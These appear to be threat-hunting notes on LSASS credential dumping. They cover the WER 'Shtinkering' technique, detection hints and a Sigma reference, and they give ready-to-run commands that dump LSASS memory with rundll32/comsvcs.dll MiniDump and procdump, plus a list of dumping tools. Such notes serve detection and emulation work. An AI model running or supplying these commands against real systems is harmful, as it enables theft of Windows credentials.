## Ref
- https://threathunterplaybook.com/hunts/windows/170105-LSASSMemoryReadAccess/notebook.html
- https://redcanary.com/threat-detection-report/techniques/lsass-memory/
- https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf
- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz
- https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before
- https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2

Atomic Red Team Emulation
- https://www.atomicredteam.io/atomic-red-team/atomics/T1003.001


## Shtinkering
- https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2
- https://media.defcon.org/DEF%20CON%2030/DEF%20CON%2030%20presentations/Asaf%20Gilboa%20-%20LSASS%20Shtinkering%20Abusing%20Windows%20Error%20Reporting%20to%20Dump%20LSASS.pdf

Sigma
- https://detection.fyi/sigmahq/sigma/windows/process_access/proc_access_win_lsass_werfault/

The term LSASS Shtinkering refers to a specific, stealthy technique used by attackers to perform LSASS credential dumping on a Windows system.

It is a novel way to bypass security defenses by forcing a legitimate system process, the Windows Error Reporting (WER) service, to create a dump file of the Local Security Authority Subsystem Service (LSASS) process.

Procedure
- Exploiting WER: The core of the technique involves an attacker with elevated privileges manipulating registry keys or calling Windows API functions to instruct the Windows Error Reporting (WER) service to generate a crash dump.
- Targeting LSASS: The attacker points the WER mechanism to the lsass.exe process. Because WER is designed to create diagnostic crash dumps of any process that fails, it has the necessary permissions to access the protected LSASS memory.
- Creating a Dump File: The WER service, executing as a legitimate system component, writes a full memory snapshot of the LSASS process to a local file, often placing it in a default location like the CrashDumps folder.
- Credential Theft: The attacker then retrieves this dump file and analyzes it offline using a tool to extract the cached credentials.

## LSASS PID
Before Dumping LSASS TA Needs To Get PID
Powershell

```
((get-process lsass).id)
```

  

Cmd
```
for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""')
```

## LSASS Runs as System
LSASS typically runs with SYSTEM-level privileges, and therefore, security teams can detect malicious use by identifying instances of LSASS running under any non-privileged user context. In order to do this, you’ll need the ability to collect users’ security identifiers (SID) for newly launched processes. Most endpoint monitoring solutions provide this as a metadata attribute associated with a process start record. Look at instances of LSASS running without a User SID including S-1-5-18.

## Common LSASS Dump Tools
Tools Used To Dump LSASS
- Mimikatz
- Cobalt Strike
- Impacket
- Metasploit
- Powersploit: Invoke-Mimikatz
- Empire
- Dumpert
- Nanodump
- Procdump: Sysinternals
- PypyKatz

## Manual Dump LSASS with Taskmgr
FileName: lsass.dmp
Defualt location is

```
C:\Users\<YourUserName>\AppData\Local\Temp
```

## Comsvcs & Rundll Minidump
- https://strontic.github.io/xcyclopedia/library/comsvcs.dll-67B51761A4BC3BD1B5367A22BA1A5B65.html

LOLBAS
- https://lolbas-project.github.io/lolbas/Libraries/comsvcs/

TTP Examples
- https://gist.github.com/JohnLaTwC/3e7dd4cd8520467df179e93fb44a434e
- https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
- https://hawk-eye.io/2022/09/tools-used-for-dumping-of-rdpcreds-via-comsvcs-dll/

Lsassy
- https://github.com/Hackndo/lsassy/blob/14d8f8ae596ecf22b449bfe919829173b8a07635/lsassy/dumpmethod/comsvcs.py

c:\windows\system32\comsvcs.dll

Notable Function Name : MiniDumpW -- Ordinal : 24
```

"C:\Windows\System32\rundll32.exe" C:\Windows\System32\comsvcs.dll MiniDump <LSASS PID> \Windows\Temp\<filename>.dmp full

```

  
Ordinal : 24
```

rundll32.exe comsvcs.dll,#24 600 C:\Users\user\Desktop\lsass.dmp full

```

  
Get-PID
```

powershell.exe -ExecutionPolicy Bypass -C "C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID>Get-Process lsass).id $env:TEMP\lsass-<filename>.dmp full"

```

## Procdump
  
Full Dump
```

procdump -accepteula -ma <lsass.exe or pid> <outputfile>

```

  
Mini Dump
```

procdump -accepteula_full -mm <lsass.exe or pid> <outputfile>

```

## Nanodump
- https://github.com/fortra/nanodump